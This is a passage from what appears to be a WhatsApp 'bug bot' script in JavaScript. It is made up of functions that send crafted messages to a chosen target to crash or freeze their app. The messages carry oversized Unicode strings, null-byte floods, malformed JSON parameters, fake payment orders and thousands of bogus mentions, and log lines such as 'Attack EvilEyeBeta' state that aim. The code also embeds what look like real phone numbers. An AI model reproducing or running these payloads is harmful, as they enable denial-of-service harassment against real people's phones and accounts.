                            body: { text: "⎋𝐑𝐈͜͢𝐙𝐗𝐕𝐄𝐋𝐙-‣" + "\u0000".repeat(5000) },
                            nativeFlowMessage: {
                                buttons: Array.from({ length: 10 }, () => ([
                                    { name: "cta_call", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_open_native_flow", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_send_location", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_send_payment", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_share_app", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_reminder", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_join_group", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) }
                                ])).flat(),
                                messageParamsJson: "{".repeat(10000)
                            }
                        }]
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, Interactive, {
        messageId: null,
        userJid: target 
    });
}

async function invo(sock, target) {
 try { 
 await sock.sendMessage(target, {
 text: '⌁Snith⌁',
 interactiveButtons: [
 {
 name: 'review_and_pay',
 buttonParamsJson: JSON.stringify({
 currency: 'XOF',
 payment_configuration: '',
 payment_type: '',
 total_amount: {
 value: '999999999',
 offset: '100'
 },
 reference_id: `StX`,
 type: 'physical-goods',
 payment_method: 'confirm',
 payment_status: 'captured',
 payment_timestamp: 'Math.floor(Date.now() / 1000)',
 order: {
 status: 'payment_requested',
 description: '𝐄𝐱‌‌𝐞𝐜𝐮‌𝐭𝐢𝐨𝐧 ⌁ Ayam Kampus',
 subtotal: {
 value: '999999999',
 offset: '100'
 }
 }
 })
 }
 ]
 });

 console.log("pket otw ke:", target);
 } catch (err) {
 console.error("paket gagal di kirim jir:", err);
 }
}

async function iosKontakNih(sock, target) {
await sock.relayMessage(target, {
  contactsArrayMessage: {
    displayName: "🚯⃟⃑.Ꮡ‌‌/𝘅⃬𝗿𝗹⃗.𝛆⃯" + "𑇂𑆵𑆴𑆿".repeat(60000),
    contacts: [
      {
        displayName: "🚯⃟⃑.Ꮡ‌‌/𝘅⃬𝗿𝗹⃗.𝛆⃯",
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;‼️⃟̊༚ С𝛆ну̦͈͈̾ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐̦͈͈̾𝖗𝚎ᜆ̦͈͈̾⋆>;;;\nFN:‼️⃟̊༚ С𝛆ну̦͈͈̾ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐̦͈͈̾𝖗𝚎ᜆ̦͈͈̾⋆>\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
      },
      {
        displayName: "🚯⃟⃑.Ꮡ‌‌/𝘅⃬𝗿𝗹⃗.𝛆⃯",
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;‼️⃟̊༚ С𝛆ну̦͈͈̾ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻�𝚎ᜆ̦͈͈̾⋆>;;;\nFN:‼️⃟̊༚ С𝛆ну̦͈͈̾ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐̦͈͈̾𝖗𝚎ᜆ̦͈͈̾⋆>\nitem1.TEL;waid=5512988103218:+55 12 98810-3218\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
      }
    ],
    contextInfo: {
      forwardingScore: 99,
      isForwarded: true,
      remoteJid: "status@broadcast",
      disappearingMode: {
        initiator: "INITIATED_BY_OTHER",
        trigger: "ACCOUNT_STATUS"
      },
      quotedAd: {
        advertiserName: "x",
        mediaType: "IMAGE",
        jpegThumbnail: null,
        caption: "x"
        },
      placeholderKey: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: "ABCDEF1234567890"
        }        
      }
    }
  }, { participant: { jid: target } })
}      

async function CallUi(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target ,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "Prossesor Proses your core" + "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson:
                     ""
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson:
                     ""
                }
              ]
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}


async function HytamJirt(target) {
  const XProtex = '_*~@2~*_\n'.repeat(10500);
  const Private = 'ោ៝'.repeat(10000);
   
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1@newsletter",
      newsletterName: "Saturn͜" + "ោ៝".repeat(20000),
      caption: "Saturn͜" + Private + "ោ៝".repeat(20000),
      inviteExpiration: "999999999",
    },
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });

  const messageCrash2 = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: sock.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "Saturn",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: ""
                    },
                },
              },
            body: {
              text: "Saturn here!" + "ꦾ".repeat(2000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
              ],
            },
          },
        },
      },
    };
    await sock.relayMessage(target, messageCrash2, {
      participant: { jid: target },
    });
console.log(chalk.red(`SENDING BUG TOO => ${target}`));
      }
  
async function crashIos(sock, target) {
  await sock.sendMessage(
    target,
    {
      text: "🚯⃟⃑.Ꮡ‌‌/𝘅⃬𝗿𝗹⃗.𝛆⃯",
      contentText: "🚯⃟⃑.Ꮡ‌‌/𝘅⃬𝗿𝗹⃗.𝛆⃯",
      footer: "# - alcatraz ~ last",
      viewOnce: true,
      buttons: [
        {
          buttonId: "🦠",
          buttonText: {
            displayText: "🦠"
          },
          type: 4,
          nativeFlowInfo: {
            name: "single_select",
            paramsJson: JSON.stringify({
              title: `► xrl-fucker ◄${"᬴".repeat(60000)}`,
              sections: [
                {
                  title: "-xrl",
                  highlight_label: "label",
                  rows: []
                }
              ]
            })
          }
        }
      ],
      headerType: 1
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
}

async function uiIos(sock, target) {
  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "🚯⃟⃑.Ꮡ‌‌/𝘅⃬𝗿𝗹⃗.𝛆⃯𝛘⃯𝛆 " + 
          "҉҈⃝⃞⃟⃠⃤꙰꙲꙱".repeat(100),
            description: "؄؂؂؀؁ب".repeat(18000),
            listType: 1,
            singleSelectReply: {
              selectedRowId: "3 Collabs"
            }
          }
        }
      }
    },
    { ephemeralExpiration: 5, timeStamp: Date.now() }
  );
}

async function newIos(sock, target) {
  const etc = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "💤⃟⃰ᰧ./𝘅𝗿𝗹.𝛆𝛘𝛆 ✩ > https://Wa.me/stickerpack/AllTheFeels",
        matchedText: "https://Wa.me/stickerpack/xrelly",
        description:
          "҉҈⃝⃞⃟⃠⃤꙰꙲" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        title:
          "‼️⃟ ‌‌./𝘅𝗿𝗹.𝛆𝛘𝛆 ✩" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );

  await sock.relayMessage(target, etc.message, {
    messageId: etc.key.id,
  });
}

async function iosNick(sock, target) {
    let nick = "🚯⃟⃑.Ꮡ‌‌/𝘅⃬𝗿𝗹⃗.𝛆⃯𝛘⃯𝛆";  
  
      sock.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: nick + "𑇂𑆵𑆴𑆿".repeat(60000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "-xrelly 1st." + "𑇂𑆵𑆴𑆿".repeat(900),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          ephemeralExpiration: 5,
          timeStamp: Date.now(),
        },
        {
          messageId: null,
        }
      );
    }

async function fcComun(sock, target) {
  
  await sock.sendMessage(target, {
  text: '🚯⃟⃑.Ꮡ‌‌/𝘅⃬𝗿𝗹⃗.𝛆⃯' + "ꦽ".repeat(50000),
  contextInfo: {
    remoteJid: "status@broadcast",
    entryPointConversionSource: "cache",
    entryPointConversionApp: "Whatsapp",
    entryPointConversionDelaySeconds: 9670,
    forwardingScore: 999,
    isForwarded: true,
  },
  interactiveButtons: [
    {
      name: 'review_and_pay',
      buttonParamsJson: JSON.stringify({
        currency: 'XOF',
        payment_configuration: [],
        payment_type: [],
        total_amount: {
          value: '999999999',
          offset: '100'
        },
        reference_id: `StX`,
        type: 'physical-goods',
        payment_method: [],
        payment_status: 'captured',
        payment_timestamp: Math.floor(Date.now() / 1000),
        order: {
          status: 'payment_requested',
          description: 'bawakdehel?!!',
          subtotal: {
            value: '999999999',
            offset: '100'
          }
        }
      })
    }
  ]
});
}

async function coreXdelay(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "coreXdelay" + "ꦾ".repeat(45000),
                address: "X-Location",
              },
            },
            body: {
              text: "X-delay" + "ꦾ".repeat(45000),
            },
            nativeFlowMessage: {
              messageParamsJson: "\u0000".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
              quotedMessage: {
                documentMessage: {
                  fileName: "coreXdelay.js",
                  mimetype: "text/plain",
                  fileLength: 100000000000000000000,
                  caption: "coreXdelay",
                  pageCount: 1000,
                  mediaKey: "\u0000".repeat(50),
                  jpegThumbnail: null,
                },
              },
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (pedo) {
    console.log(pedo);
  }
}

async function delay5GB(target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: ".k",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "\n",
              newsletterJid: "0@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "zep" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}

async function otaxnewdocu(sock, target) {
  let docu = generateWAMessageFromContent(target, {
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/519762707_740185715084744_4977165759317976923_n.enc?ccb=11-4&oh=01_Q5Aa2AGzO7QTWKQKGXCBsP0s3FvW_1wqm1IJe-Hr7RSJGPOnrQ&oe=689A12CF&_nc_sid=5e03e0&mms3=true",
      mimetype: "application/pdf",
      fileSha256: "8bm4IyAXVv+iqbrtXIJ32ZgCL6al2mnpewvrMwrqSz8=",
      fileLength: "999999999",
      pageCount: 92828282882,
      mediaKey: "5y/wRwOnBCEEMh6pBBNztHFAROZDvBEuX6lZI3orfQE=",
      fileName: "҉‼️⃟ ‼️⃟ ҈⃝⃞⃟⃠⃤꙰꙲꙱‼️⃟ 𝕻𝖊𝖑𝖊𝖗𝖀𝖗𝖎𝖕𝕺𝖙𝖆𝖝∮⸙⸎.pdf",
      fileEncSha256: "YgCZHWxMaT0PNGhbyPJvIqeEdicCUeJF7ooUgz3VVyY=",
      directPath: "/v/t62.7119-24/519762707_740185715084744_4977165759317976923_n.enc?ccb=11-4&oh=01_Q5Aa2AGzO7QTWKQKGXCBsP0s3FvW_1wqm1IJe-Hr7RSJGPOnrQ&oe=689A12CF&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1752349203",
      contactVcard: true,
      thumbnailDirectPath: "/v/t62.36145-24/30978706_624564333438537_9140700599826117621_n.enc?ccb=11-4&oh=01_Q5Aa2AEuw_7H8iAXcpyYOnG8a_u8lGKh-YjLq4XAzWQvsXQlzw&oe=689A2103&_nc_sid=5e03e0",
      thumbnailSha256: "xPYGe7EjjF+blg7XiQr8G2emJFmMbyOrSVZIW0WJxuo=",
      thumbnailEncSha256: "BT9gu5nq/bR0TvUJnrscK8/RW+24cNMy1VGILh0zUdk=",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
      contextInfo: {
        expiration: 1,
        ephemeralSettingTimestamp: 1,
        forwardingScore: 9999,
        isForwarded: true,
        remoteJid: "status@broadcast",
        disappearingMode: {
          initiator: "INITIATED_BY_OTHER",
          trigger: "UNKNOWN_GROUPS"
        },
        StatusAttributionType: 1,
        forwardedAiBotMessageInfo: {
          botName: "Meta",
          botJid: "13135550002@s.whatsapp.net",
          creatorName: "otax"
        },
        externalAdReply: {
          showAdAttribution: false,
          renderLargerThumbnail: true
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 1,
            expiryTimestamp: null
          }
        }
      },
      thumbnailHeight: 480,
      thumbnailWidth: 339,
      caption: "ꦽ".repeat(150000)
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, docu.message, { messageId: docu.key.id });
}

async function EvilEyeBeta(sock, target) {
  try {
    const mentionedList = [
      "13135550002@s.whatsapp.net",
      ...Array.from({ length: 2000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ];

    const embeddedMusic = {
      musicContentMediaId: "589608164114571",
      songId: "870166291800508",
      author: "7ooModds" + "ោ៝".repeat(10000),
      title: "Indah <3",
      artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
      artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
      artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
      artistAttribution: "https://www.instagram.com/_u/J.oxyy",
      countryBlocklist: true,
      isExplicit: true,
      artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMsg = {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "EY0PNB4nOae0b9/f+tNPB99rJSmJZ/Ns2SEfu7Jc8wI=",
        fileLength: "2534607",
        seconds: 8,
        mediaKey: "YDQMBzXkapRZjXrPVAr2CwEPIBnv6aDHHQLaEYLOPyE=",
        height: 1280,
        width: 720,
        fileEncSha256: "XcTQbrJvO9ICWDBnW8710Ow4QLbygfTUYzP3l0rg0no=",
        directPath: "/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1757337021",
        jpegThumbnail: Buffer.from("...base64thumb...", "base64"),
        contextInfo: {
          isSampled: true,
          mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: "7ooModds FVerse"
        },
        annotations: [
          {
            embeddedContent: { embeddedMusic },
            embeddedAction: true
          }
        ]
      }
    };

    const stickerMsg = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: ["13135550002@s.whatsapp.net"],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: true,
            isAiSticker: true,
            isLottie: true
          }
        }
      }
    };

    const biji = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "You Idiot's",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10".repeat(1045000),
                version: 3
              },
              entryPointConversionSource: "galaxy_message"
            }
          }
        }
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "999999")
      }
    );

    await sock.relayMessage("status@broadcast", biji.message, {
      messageId: biji.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });
    await sleep(1000); // sᴇᴛᴛɪɴɢ ᴀᴊᴀ 

    await sock.relayMessage("status@broadcast", videoMsg, {
      messageId: "EvilEye-" + Date.now(),
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });
    await sleep(1000); // sᴇᴛᴛɪɴɢ ᴀᴊᴀ 

    await sock.relayMessage("status@broadcast", stickerMsg, {
      messageId: "Sticker-" + Date.now(),
      statusJidList: [target]
    });
    await sleep(1000); // sᴇᴛᴛɪɴɢ ᴀᴊᴀ 

    console.log(chalk.red(`Attack EvilEyeBeta : ${target}`));
  } catch (err) {
    console.error("EvilEyeBeta Error:", err);
  }
}

async function delayvisibotax(sock, target) {
console.log(chalk.red(`Dewa Send Bug`));
  const peler = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "𝘐𝘮 𝘖𝘛𝘈𝘟(⸙)", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "{}"
        },
        contextInfo: {
          expiration: 1,
          ephemeralSettingTimestamp: 1,
          forwardingScore: 9999,
          isForwarded: true,
          remoteJid: "status@broadcast",
          disappearingMode: {
            initiator: "INITIATED_BY_OTHER",
            trigger: "UNKNOWN_GROUPS"
          },
          StatusAttributionType: 1,
          forwardedAiBotMessageInfo: {
            botName: "Meta",
            botJid: "13135550002@s.whatsapp.net",
            creatorName: "otax"
          },
          externalAdReply: {
            showAdAttribution: false,
            renderLargerThumbnail: true
          },
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 1,
              expiryTimestamp: null
            }
          }
        }
      }
    }
  }, {
    ephemeralExpiration: 999999,
    forwardingScore: 999999,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
  });

  await sock.relayMessage(target, peler.message, {
    messageId: peler.key.id,
    participant: {jid: target},
  });

  await sleep(1000);

  await sock.sendMessage(target, {
    delete: {
      remoteJid: target,
      fromMe: true,
      id: peler.key.id
    }
  });
}

async function CrashGroup(sock, target, mention) {
    let msg = await generateWAMessageFromContent(target, {
        orderMessage: {
            orderId: "2794608090730733",
            thumbnail: "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